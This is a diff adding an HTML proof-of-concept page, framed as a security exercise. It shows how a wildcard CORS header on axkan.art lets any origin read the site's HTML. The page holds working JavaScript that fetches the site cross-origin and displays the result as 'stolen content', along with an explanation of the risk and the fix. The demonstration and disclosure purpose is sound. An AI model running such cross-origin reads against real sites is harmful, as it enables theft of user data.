@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head><title>AXKAN Security Exercise - CORS Exploit PoC</title></head>
+<body style="font-family:Arial;max-width:800px;margin:40px auto;">
+
+<h1>CORS Exploit: Stealing data from axkan.art</h1>
+
+<p>axkan.art sends <code>Access-Control-Allow-Origin: *</code> which means
+ANY website can read its content via JavaScript.</p>
+
+<h2>What a hacker could do:</h2>
+
+<button onclick="stealContent()" style="font-size:18px;padding:10px 30px;background:#e52421;color:white;border:none;border-radius:5px;cursor:pointer;">
+  Run CORS Exploit
+</button>
+
+<div id="result" style="margin-top:20px;padding:20px;background:#f5f5f5;border-radius:5px;display:none;">
+  <h3>Stolen content from axkan.art:</h3>
+  <pre id="stolen" style="max-height:400px;overflow:auto;font-size:12px;"></pre>
+</div>
+
+<script>
+async function stealContent() {
+  try {
+    // This works because axkan.art allows ALL origins (*)
+    const response = await fetch('https://axkan.art');
+    const html = await response.text();
+
+    document.getElementById('result').style.display = 'block';
+    document.getElementById('stolen').textContent =
+      `Successfully fetched ${html.length} characters from axkan.art!\n\n` +
+      `First 2000 chars:\n` +
+      html.substring(0, 2000);
+
+  } catch (e) {
+    document.getElementById('result').style.display = 'block';
+    document.getElementById('stolen').textContent = 'CORS blocked the request: ' + e.message;
+  }
+}
+</script>
+
+<h2 style="margin-top:40px;">Why this is dangerous:</h2>
+<ul>
+  <li>A hacker's website can silently read all of axkan.art's HTML</li>
+  <li>If axkan.art had user-specific content (like a logged-in dashboard), the hacker could steal it</li>
+  <li>The user just visits the hacker's page — no interaction needed</li>
+  <li>Fix: Change <code>Access-Control-Allow-Origin: *</code> to only allow your own domains</li>
+</ul>
+
+<p style="color:red;margin-top:20px;">
+  <strong>SECURITY EXERCISE:</strong> Open this file in Chrome, click the button,
+  and watch it pull the full HTML from axkan.art — from a different origin.
+</p>
+
+</body>
+</html>
